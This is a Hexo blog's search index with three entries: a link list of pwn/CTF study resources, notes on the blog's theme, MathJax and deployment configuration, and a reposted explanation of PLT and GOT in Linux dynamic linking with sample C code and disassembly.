<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>pwn 知识点汇总</title>
    <url>/2024/11/14/ctfpwn/pwn-%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本篇只给出原博客地址，方便review而已。</p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="重要工具"><a href="#重要工具" class="headerlink" title="重要工具"></a>重要工具</h2><ul>
<li><a href="/2024/11/14/ctfpwn/tools/pwn%E5%B7%A5%E5%85%B71-pwntools%E6%A8%A1%E5%9D%97/" title="pwn工具1 pwntools模块">pwntools</a>
</li>
</ul>
<h2 id="计算机指令系统"><a href="#计算机指令系统" class="headerlink" title="计算机指令系统"></a>计算机指令系统</h2><h3 id="指令寻址"><a href="#指令寻址" class="headerlink" title="指令寻址"></a>指令寻址</h3><ul>
<li><a href="https://www.zhihu.com/people/chen-hao-dong-34-27">鸫鸫鹅（知乎）</a>：<a href="https://zhuanlan.zhihu.com/p/370204019">关于寻址方式一篇就够了</a></li>
</ul>
<h3 id="汇编基础知识"><a href="#汇编基础知识" class="headerlink" title="汇编基础知识"></a>汇编基础知识</h3><p><code>objdump</code>输出的是AT&amp;T风格的汇编，各种形态的汇编之间有很大区别。不注意这点，一个操作中谁<code>mov</code>给谁容易干混。</p>
<h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="plt表与got表及elf的安全属性"><a href="#plt表与got表及elf的安全属性" class="headerlink" title="plt表与got表及elf的安全属性"></a>plt表与got表及elf的安全属性</h4><ul>
<li><a href="/2024/11/13/transship/%E8%BD%AC%E8%BD%BD0001-plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A81/" title="转载0001 plt表和got表1">转载0001-plt表和got表1</a></li>
<li><a href="/2024/11/13/transship/%E8%BD%AC%E8%BD%BD0002-plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A82/" title="转载0002 plt表和got表2">转载0002-plt表和got表2</a></li>
<li><a href="/2024/11/13/transship/%E8%BD%AC%E8%BD%BD0003-plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A83/" title="转载0003 plt表和got表3">转载0003-plt表和got表3</a></li>
<li><a href="/2024/11/13/transship/%E8%BD%AC%E8%BD%BD0004-plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A84/" title="转载0004 plt表和got表4">转载0004-plt表和got表4</a></li>
<li><a href="/2024/11/13/transship/%E8%BD%AC%E8%BD%BD0005-plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A85/" title="转载0005 plt表和got表5">转载0005-plt表和got表5</a></li>
<li><a href="/2024/11/14/ctfpwn/knowledge/pwn%E7%9F%A5%E8%AF%86%E7%82%B91-elf%E7%9A%84%E5%AE%89%E5%85%A8%E5%B1%9E%E6%80%A7/" title="pwn知识点1 elf的安全属性">elf的安全属性</a></li>
<li>stormQ：<a href="https://csstormq.github.io/blog/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%AF%87%E4%B9%8B%E9%93%BE%E6%8E%A5%EF%BC%8814%EF%BC%89%EF%BC%9A.plt%E3%80%81.plt.got%E3%80%81.got%20%E5%92%8C%20.got.plt%20section%20%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB">计算机系统篇之链接（14）：.plt、.plt.got、.got 和 .got.plt sections 之间的区别</a></li>
</ul>
<h4 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h4><ul>
<li><a href="/2024/11/14/ctfpwn/knowledge/pwn%E7%9F%A5%E8%AF%86%E7%82%B92-ASLR-PIE%E5%92%8CPIC%E7%9A%84%E5%BC%82%E5%90%8C/" title="pwn知识点2 ASLR,PIE和PIC的异同">ASLR、PIE和PIC的异同</a>
</li>
</ul>
<h4 id="函数调用与栈基本知识"><a href="#函数调用与栈基本知识" class="headerlink" title="函数调用与栈基本知识"></a>函数调用与栈基本知识</h4><ul>
<li><a href="https://www.zhihu.com/people/Jwizard">Jwizard（知乎）</a>：<a href="https://zhuanlan.zhihu.com/p/25816426">手把手教你栈溢出从入门到放弃（上）</a></li>
</ul>
<h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><ul>
<li><a href="/2024/11/14/ctfpwn/wp/ctfshow-pwn24-WP/" title="ctfshow-pwn24 WP">自己做ctfshow上ret2text题的WP</a>
</li>
</ul>
<h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>32位的ret2libc和64位的ret2libc不大一样。参考：</p>
<ul>
<li><a href="https://blog.csdn.net/Bossfrank">Boss_frank(csdn)</a>：<a href="https://blog.csdn.net/Bossfrank/article/details/134872403">pwn入门：基本栈溢出之ret2libc详解（以32位+64位程序为例）(csdn)</a></li>
<li><a href="/image/post/ctf/pwn/wp/ctfshow-pwn25-wp/payload.png">山深有杏（腾讯云）</a>：<a href="https://cloud.tencent.com/developer/article/2384856">PWN从入门到放弃(7)——栈溢出之ret2libc（腾讯云）</a><br>讲得很好</li>
</ul>
<hr>
<p>自己做的题：</p>
<ul>
<li><a href="/2024/11/12/ctfpwn/wp/ctfshow-pwn25-WP/" title="ctfshow-pwn25 WP">ctfshow-pwn25：32位的ret2libc</a></li>
</ul>
]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>知识点</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>pwn</tag>
        <tag>知识点</tag>
      </tags>
  </entry>
  <entry>
    <title>本Blog从默认hexo更改了哪些配置？</title>
    <url>/2024/11/12/%E6%9C%ACBlog%E4%BB%8E%E9%BB%98%E8%AE%A4hexo%E6%9B%B4%E6%94%B9%E4%BA%86%E5%93%AA%E4%BA%9B%E9%85%8D%E7%BD%AE%EF%BC%9F/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>方便迁移</p>
<p><del>其实备份的时候什么都不用记录</del><br>安装的组件会记录在<code>package.json</code>里。</p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="变换的组件"><a href="#变换的组件" class="headerlink" title="变换的组件"></a>变换的组件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm install hexo-generator-search --save</span><br><span class="line">npm install hexo-generator-searchdb --save</span><br><span class="line">npm install hexo-renderer-pug --save </span><br><span class="line">npm install hexo-renderer-stylus --save</span><br><span class="line">npm uninstall hexo-renderer-marked --save</span><br><span class="line">npm install hexo-renderer-kramed --save</span><br></pre></td></tr></table></figure>
<h2 id="加载的风格"><a href="#加载的风格" class="headerlink" title="加载的风格"></a>加载的风格</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br></pre></td></tr></table></figure>
<p>在<code>_config.yml</code>中由<br><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">theme:</span> <span class="string">landscape</span></span><br></pre></td></tr></table></figure><br>变为<br><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">theme:</span> <span class="string">butterfly</span></span><br></pre></td></tr></table></figure></p>
<h2 id="设置的调整"><a href="#设置的调整" class="headerlink" title="设置的调整"></a>设置的调整</h2><h3 id="mathjax：latex的使用"><a href="#mathjax：latex的使用" class="headerlink" title="mathjax：latex的使用"></a>mathjax：latex的使用</h3><p>基于butterfly风格的<a href="https://proton.lat/2024/06/19/Mathjax/index.html">文档</a></p>
<p>依赖于前述组件的更换<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm uninstall hexo-renderer-marked --save</span><br><span class="line">npm install hexo-renderer-kramed --save</span><br></pre></td></tr></table></figure></p>
<p>修改了设置</p>
<p>在<code>_config.butterfly.yml</code>中由<br><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">math:</span></span><br><span class="line">  <span class="comment"># Choose: mathjax, katex</span></span><br><span class="line">  <span class="comment"># Leave it empty if you don&#x27;t need math</span></span><br><span class="line">  <span class="attr">use:</span> </span><br><span class="line">  <span class="attr">per_page:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">hide_scrollbar:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">mathjax:</span></span><br><span class="line">    <span class="comment"># Enable the contextual menu</span></span><br><span class="line">    <span class="attr">enableMenu:</span> <span class="literal">true</span></span><br><span class="line">    <span class="comment"># Choose: all / ams / none, This controls whether equations are numbered and how</span></span><br><span class="line">    <span class="attr">tags:</span> <span class="string">none</span></span><br></pre></td></tr></table></figure><br>变为<br><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">math:</span></span><br><span class="line">  <span class="comment"># Choose: mathjax, katex</span></span><br><span class="line">  <span class="comment"># Leave it empty if you don&#x27;t need math</span></span><br><span class="line">  <span class="attr">use:</span> <span class="string">mathjax</span></span><br><span class="line">  <span class="attr">per_page:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">hide_scrollbar:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">mathjax:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="comment"># Enable the contextual menu</span></span><br><span class="line">    <span class="attr">enableMenu:</span> <span class="literal">true</span></span><br><span class="line">    <span class="comment"># Choose: all / ams / none, This controls whether equations are numbered and how</span></span><br><span class="line">    <span class="attr">tags:</span> <span class="string">none</span></span><br></pre></td></tr></table></figure></p>
<p>在<code>_config.yml</code>中添加了<br><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">kramed:</span></span><br><span class="line">  <span class="attr">gfm:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">pedantic:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">sanitize:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">tables:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">breaks:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">smartLists:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">smartypants:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></p>
<p>在<code>[blogroot]/node_modules/kramed/lib/rules/inline.js</code></p>
<p>中将<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Line11</span>:<span class="attr">escape</span>: <span class="regexp">/^\\([\\`*&#123;&#125;\[\]()#$+\-.!_&gt;])/</span>,</span><br><span class="line"><span class="title class_">Line20</span>:<span class="attr">em</span>: <span class="regexp">/^\b_((?:__|[\s\S])+?)_\b|^\*((?:\*\*|[\s\S])+?)\*(?!\*)/</span>,</span><br><span class="line"><span class="title class_">Line64</span>:<span class="attr">escape</span>: <span class="title function_">replace</span>(inline.<span class="property">escape</span>)(<span class="string">&#x27;])&#x27;</span>, <span class="string">&#x27;~|])&#x27;</span>)(),</span><br></pre></td></tr></table></figure><br>注释后变为<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">escape</span>: <span class="regexp">/^\\([`*\[\]()#$+\-.!_&gt;])/</span>,<span class="comment">//escape: /^\\([\\`*&#123;&#125;\[\]()#$+\-.!_&gt;])/,</span></span><br><span class="line"><span class="attr">em</span>: <span class="regexp">/^\*((?:\*\*|[\s\S])+?)\*(?!\*)/</span>,<span class="comment">//em: /^\b_((?:__|[\s\S])+?)_\b|^\*((?:\*\*|[\s\S])+?)\*(?!\*)/,</span></span><br><span class="line"><span class="attr">escape</span>: <span class="title function_">replace</span>(inline.<span class="property">escape</span>)(<span class="string">&#x27;])&#x27;</span>, <span class="string">&#x27;~])&#x27;</span>)(),<span class="comment">//escape: replace(inline.escape)(&#x27;])&#x27;, &#x27;~|])&#x27;)(),</span></span><br></pre></td></tr></table></figure><br>分别解决了：</p>
<ul>
<li>反斜杠<code>\\</code>被转义为<code>\</code>而非LaTeX换行<ul>
<li>问题描述：当公式中出现<code>\\</code>表示换行时，会被kramed渲染为<code>\</code>，导致公式显示异常。</li>
<li>方法：取消了对<code>\\</code>的转义。</li>
</ul>
</li>
<li>下划线<code>_</code>被转义为斜体而非LaTeX下标<ul>
<li>问题描述：当公式中出现多个下划线时，会被kramed渲染为Markdown斜体，导致公式显示异常。</li>
<li>Markdown本身的语法是支持<code>*</code>和<code>_</code>都被转义为斜体的，所以我们可以取消掉kramed对<code>_</code>的转义。</li>
<li>同时需要指出的是，latex中应尽量避免使用<code>*</code>，而使用<code>\ast</code>。</li>
</ul>
</li>
<li>反斜杠加竖线<code>\|</code>被转义为<code>|</code>而非LaTeX双竖线<ul>
<li>问题描述：当公式中出现<code>\|</code>表示紧贴符号时，会被kramed渲染为<code>|</code>，导致公式显示异常。</li>
<li>方法：取消了对<code>\|</code>的转义。</li>
</ul>
</li>
</ul>
<p>没有改全，只是改到够用。<br>参考：</p>
<ul>
<li><a href="https://blog.csdn.net/weixin_44441126/article/details/119745642">解决hexo-renderer-kramed渲染冲突的部分问题</a></li>
<li><a href="https://blog.csdn.net/qq_27489877/article/details/140649135">butterfly主题插入数学公式LaTeX</a></li>
<li>推荐<a href="https://blog.csdn.net/qq_36667170/article/details/105846999">hexo 更换 markdown渲染器 @upupming/hexo-renderer-markdown-it-plus</a>，讲得很全。</li>
</ul>
<h3 id="个性化的变化"><a href="#个性化的变化" class="headerlink" title="个性化的变化"></a>个性化的变化</h3><p>在<code>_config.butterfly.yml</code>中由<br><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="comment"># Home: / || fas fa-home</span></span><br><span class="line">  <span class="comment"># List||fas fa-list:</span></span><br><span class="line">  <span class="comment">#   Music: /music/ || fas fa-music</span></span><br><span class="line">  <span class="comment">#   Movie: /movies/ || fas fa-video</span></span><br></pre></td></tr></table></figure><br>变为<br><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="comment"># Home: / || fas fa-home</span></span><br><span class="line">  <span class="comment"># List||fas fa-list:</span></span><br><span class="line">  <span class="comment">#   Music: /music/ || fas fa-music</span></span><br><span class="line">  <span class="comment">#   Movie: /movies/ || fas fa-video</span></span><br><span class="line">  <span class="string">首页:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="string">时间轴:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-archive</span></span><br><span class="line">  <span class="comment">#遥远的回忆: /memories/ || fas fa-archive</span></span><br><span class="line">  <span class="string">标签:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-tags</span></span><br><span class="line">  <span class="string">分类:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-folder-open</span></span><br><span class="line">  <span class="string">清单||fa</span> <span class="attr">fa-heartbeat:</span></span><br><span class="line">    <span class="string">音乐:</span> <span class="string">/music/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-music</span></span><br><span class="line">    <span class="string">照片:</span> <span class="string">/gallery/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-images</span></span><br><span class="line">    <span class="string">电影:</span> <span class="string">/movies/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-video</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>更改了网页图标、页面背景、侧边栏和基本信息的设置等。</p>
<p>在<code>/source/</code>中保存了<code>CNAME</code>文件以适应Github Pages。</p>
<h3 id="deploy的更改"><a href="#deploy的更改" class="headerlink" title="deploy的更改"></a>deploy的更改</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">    <span class="attr">repo:</span></span><br><span class="line">      <span class="attr">server:</span> <span class="string">ssh://git@47.113.114.17:22535/home/git/repos/blog.git</span></span><br><span class="line">    <span class="attr">branch:</span> <span class="string">master</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">    <span class="attr">repo:</span> </span><br><span class="line">      <span class="attr">server:</span> <span class="string">ssh://git@github.com/WHUphaero/WHUphaero.github.io.git</span></span><br><span class="line">    <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure>
<h3 id="local-search"><a href="#local-search" class="headerlink" title="local-search"></a>local-search</h3><p>根据butterfly风格的<a href="https://butterfly.js.org/posts/4aa8abbe/?highlight=mathjax">文档</a></p>
<p>基于前述<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-search --save</span><br><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure></p>
<p>在<code>_config.butterfly.yml</code>中由<br><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">search:</span></span><br><span class="line">  <span class="comment"># Choose: algolia_search / local_search / docsearch</span></span><br><span class="line">  <span class="comment"># leave it empty if you don&#x27;t need search</span></span><br><span class="line">  <span class="attr">use:</span></span><br><span class="line">  <span class="attr">placeholder:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Algolia Search</span></span><br><span class="line">  <span class="attr">algolia_search:</span></span><br><span class="line">    <span class="comment"># Number of search results per page</span></span><br><span class="line">    <span class="attr">hitsPerPage:</span> <span class="number">6</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Local Search</span></span><br><span class="line">  <span class="attr">local_search:</span></span><br><span class="line">    <span class="comment"># Preload the search data when the page loads.</span></span><br><span class="line">    <span class="attr">preload:</span> <span class="literal">false</span></span><br><span class="line">    <span class="comment"># Show top n results per article, show all results by setting to -1</span></span><br><span class="line">    <span class="attr">top_n_per_article:</span> <span class="number">1</span></span><br><span class="line">    <span class="comment"># Unescape html strings to the readable one.</span></span><br><span class="line">    <span class="attr">unescape:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">CDN:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Docsearch</span></span><br><span class="line">  <span class="comment"># https://docsearch.algolia.com/</span></span><br><span class="line">  <span class="attr">docsearch:</span></span><br><span class="line">    <span class="attr">appId:</span></span><br><span class="line">    <span class="attr">apiKey:</span></span><br><span class="line">    <span class="attr">indexName:</span></span><br><span class="line">    <span class="attr">option:</span></span><br></pre></td></tr></table></figure><br>变为<br><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">search:</span></span><br><span class="line">  <span class="comment"># Choose: algolia_search / local_search / docsearch</span></span><br><span class="line">  <span class="comment"># leave it empty if you don&#x27;t need search</span></span><br><span class="line">  <span class="attr">use:</span> <span class="string">local_search</span></span><br><span class="line">  <span class="attr">placeholder:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Algolia Search</span></span><br><span class="line">  <span class="attr">algolia_search:</span></span><br><span class="line">    <span class="comment"># Number of search results per page</span></span><br><span class="line">    <span class="attr">hitsPerPage:</span> <span class="number">6</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Local Search</span></span><br><span class="line">  <span class="attr">local_search:</span></span><br><span class="line">    <span class="comment"># Preload the search data when the page loads.</span></span><br><span class="line">    <span class="attr">preload:</span> <span class="literal">false</span></span><br><span class="line">    <span class="comment"># Show top n results per article, show all results by setting to -1</span></span><br><span class="line">    <span class="attr">top_n_per_article:</span> <span class="number">1</span></span><br><span class="line">    <span class="comment"># Unescape html strings to the readable one.</span></span><br><span class="line">    <span class="attr">unescape:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">CDN:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Docsearch</span></span><br><span class="line">  <span class="comment"># https://docsearch.algolia.com/</span></span><br><span class="line">  <span class="attr">docsearch:</span></span><br><span class="line">    <span class="attr">appId:</span></span><br><span class="line">    <span class="attr">apiKey:</span></span><br><span class="line">    <span class="attr">indexName:</span></span><br><span class="line">    <span class="attr">option:</span></span><br></pre></td></tr></table></figure></p>
<h2 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h2><p>基于<a href="https://blog.liukuan.cc/Hexo/backup-restore/">博客</a>和<a href="https://blog.csdn.net/muzihuaner/article/details/113880440">博客</a></p>
<p>坑：（来自后一个博客的提醒）注意，如果你之前克隆过theme中的主题文件，那么应该把主题文件中的.git文件夹删掉，因为git不能嵌套上传，最好是显示隐藏文件，检查一下有没有，否则上传的时候会出错，导致你的主题文件无法上传，这样你的配置在别的电脑上就用不了了。</p>
<p>顺便讲解一下git仓库管理命令</p>
<p>初始化<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git init <span class="comment">#仓库初始化</span></span><br><span class="line">git add * <span class="comment">#将文件加入暂存区</span></span><br><span class="line">git commit -m <span class="string">&quot;&#123;提示词&#125;&quot;</span> <span class="comment">#将暂存区文件给一个提示词（用于标识更新时间），转入仓库</span></span><br><span class="line">git remote add origin git@github.com/&#123;用户名&#125;/&#123;仓库名&#125;.git <span class="comment">#存储远程仓库origin以免以后重复输</span></span><br><span class="line">git push origin master <span class="comment">#我只有push master分支才能成功，因为我本地git可能默认产生的是master分支</span></span><br></pre></td></tr></table></figure></p>
<p>更新<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git add *</span><br><span class="line">git commit -m <span class="string">&quot;...&quot;</span></span><br><span class="line">git push origin master</span><br></pre></td></tr></table></figure></p>
<p>迁移拉取<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@github.com/&#123;用户名&#125;/&#123;仓库名&#125;.git</span><br><span class="line">npm install</span><br><span class="line">hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure></p>
<h2 id="ICP"><a href="#ICP" class="headerlink" title="ICP"></a>ICP</h2><p>在<code>/themes/butterfly/layout/includes/footer.pug</code>中添加了ICP备案。</p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>转载0001 plt表和got表1</title>
    <url>/2024/11/13/transship/%E8%BD%AC%E8%BD%BD0001-plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A81/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是转载于CSDN的文章，仅用作存储，遵循 CC 4.0 BY-SA版权协议。</p>
<p><a href="https://blog.csdn.net/linyt/article/details/51635768">聊聊Linux动态链接中的PLT和GOT（1）——何谓PLT与GOT</a></p>
<p>原作者：<a href="https://linyt.blog.csdn.net/">海枫</a></p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="为什么要PLT和GOT"><a href="#为什么要PLT和GOT" class="headerlink" title="为什么要PLT和GOT"></a>为什么要PLT和GOT</h2><p>在介绍PLT和GOT出场之前，先以一个简单的例子引入两个主角，各位请看以下代码：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_banner</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to World of PLT and GOT\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    print_banner();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>编译:<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -Wall -g -o test.o -c test.c -m32</span><br></pre></td></tr></table></figure><br>链接:<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -o test test.o -m32</span><br></pre></td></tr></table></figure><br>注意：现代Linux系统都是x86_64系统了，后面需要对中间文件test.o以及可执行文件test反编译，分析汇编指令，因此在这里使用-m32选项生成i386架构指令而非x86_64架构指令。</p>
<p>经编译和链接阶段之后，test可执行文件中print_banner函数的汇编指令会是怎样的呢？我猜应该与下面的汇编类似：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">080483cc &lt;print_banner&gt;:</span><br><span class="line"> 80483cc:    push %ebp</span><br><span class="line"> 80483cd:    mov  %esp, %ebp</span><br><span class="line"> 80483cf:    sub  $0x8, %esp</span><br><span class="line"> 80483d2:    sub  $0xc, %esp</span><br><span class="line"> 80483d5:    push $0x80484a8  </span><br><span class="line"> 80483da:    call **&lt;printf函数的地址&gt;**</span><br><span class="line"> 80483df:    add $0x10, %esp</span><br><span class="line"> 80483e2:    nop</span><br><span class="line"> 80483e3:    leave</span><br><span class="line"> 80483e4:    ret</span><br></pre></td></tr></table></figure><br>print_banner函数内调用了printf函数，而printf函数位于glibc动态库内，所以在编译和链接阶段，链接器无法知知道进程运行起来之后printf函数的加载地址。故上述的<code>&lt;printf函数地址&gt;</code> 一项是无法填充的，只有进程运运行后，printf函数的地址才能确定。</p>
<p>那么问题来了：<strong>进程运行起来之后，glibc动态库也装载了，printf函数地址亦已确定，上述call指令如何修改（重定位）呢？</strong></p>
<p>一个简单的方法就是将指令中的<code>&lt;printf函数地址&gt;</code>修改printf函数的真正地址即可。</p>
<p>但这个方案面临两个问题：</p>
<ul>
<li>现代操作系统不允许修改代码段，只能修改数据段</li>
<li>如果print_banner函数是在一个动态库（.so对象）内，修改了代码段，那么它就无法做到系统内所有进程共享同一个动态库。 </li>
</ul>
<p><strong>因此，printf函数地址只能回写到数据段内，而不能回写到代码段上。</strong></p>
<p>注意：刚才谈到的回写，是指运行时修改，更专业的称谓应该是<strong>运行时重定位</strong>，与之相对应的还有<strong>链接时重定位</strong>。</p>
<p>说到这里，需要把编译链接过程再展开一下。我们知道，每个编译单元（通常是一个.c文件，比如前面例子中的test.c）都会经历编译和链接两个阶段。</p>
<p>编译阶段是将.c源代码翻译成汇编指令的中间文件，比如上述的test.c文件，经过编译之后，生成test.o中间文件。print_banner函数的汇编指令如下（使用强调内容<strong>objdump -d test.o</strong>命令即可输出）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000 &lt;print_banner&gt;:</span><br><span class="line">      0:  55                   push %ebp</span><br><span class="line">      1:  89 e5                mov %esp, %ebp</span><br><span class="line">      3:  83 ec 08             sub   $0x8, %esp</span><br><span class="line">      6:  c7 04 24 00 00 00 00 movl  $0x0, (%esp)</span><br><span class="line">      d:  e8 fc ff ff ff       call  e &lt;print_banner+0xe&gt;</span><br><span class="line">     12:  c9                   leave</span><br><span class="line">     13:  c3                   ret</span><br></pre></td></tr></table></figure>
<p>是否注意到call指令的操作数是fc ff ff ff，翻译成16进制数是0xfffffffc（x86架构是小端的字节序），看成有符号是-4。这里应该存放printf函数的地址，但由于编译阶段无法知道printf函数的地址，所以预先放一个-4在这里，然后用重定位项来描述：<strong>这个地址在链接时要修正，它的修正值是根据printf地址（更确切的叫法应该是符号，链接器眼中只有符号，没有所谓的函数和变量）来修正，它的修正方式按相对引用方式。</strong></p>
<p>这个过程称为<strong>链接时重定位</strong>，与刚才提到的运行时重定位工作原理完全一样，只是修正时机不同。</p>
<p><strong>链接阶段</strong>是将一个或者多个中间文件（.o文件）通过链接器将它们链接成一个可执行文件，链接阶段主要完成以下事情：</p>
<ul>
<li>各个中间文之间的同名section合并</li>
<li>对代码段，数据段以及各符号进行地址分配</li>
<li>链接时重定位修正</li>
</ul>
<p>除了重定位过程，其它动作是无法修改中间文件中函数体内指令的，而重定位过程也只能是修改指令中的操作数，换句话说，<strong>链接过程无法修改编译过程生成的汇编指令</strong>。</p>
<p>那么问题来了：<strong>编译阶段怎么知道printf函数是在glibc运行库的，而不是定义在其它.o中</strong></p>
<p>答案往往令人失望：<strong>编译器是无法知道的</strong></p>
<p>那么编译器只能老老实实地生成调用printf的汇编指令，printf是在glibc动态库定位，或者是在其它.o定义这两种情况下，它都能工作。如果是在其它.o中定义了printf函数，那在链接阶段，printf地址已经确定，可以直接重定位。如果printf定义在动态库内（链接阶段是可以知道printf在哪定义的，只是如果定义在动态库内不知道它的地址而已），链接阶段无法做重定位。</p>
<p>根据前面讨论，运行时重定位是无法修改代码段的，只能将printf重定位到数据段。那在编译阶段就已生成好的call指令，怎么感知这个已重定位好的数据段内容呢？</p>
<p>答案是：<strong>链接器生成一段额外的小代码片段，通过这段代码支获取printf函数地址，并完成对它的调用。</strong></p>
<p>链接器生成额外的伪代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">// 调用printf的call指令</span><br><span class="line">call printf_stub</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">printf_stub:</span><br><span class="line">    mov rax, [printf函数的储存地址] // 获取printf重定位之后的地址</span><br><span class="line">    jmp rax // 跳过去执行printf函数</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">...</span><br><span class="line">printf函数的储存地址：</span><br><span class="line">　　这里储存printf函数重定位后的地址</span><br></pre></td></tr></table></figure>
<p>链接阶段发现printf定义在动态库时，链接器生成一段小代码print_stub，然后printf_stub地址取代原来的printf。因此转化为链接阶段对printf_stub做链接重定位，而运行时才对printf做运行时重定位。</p>
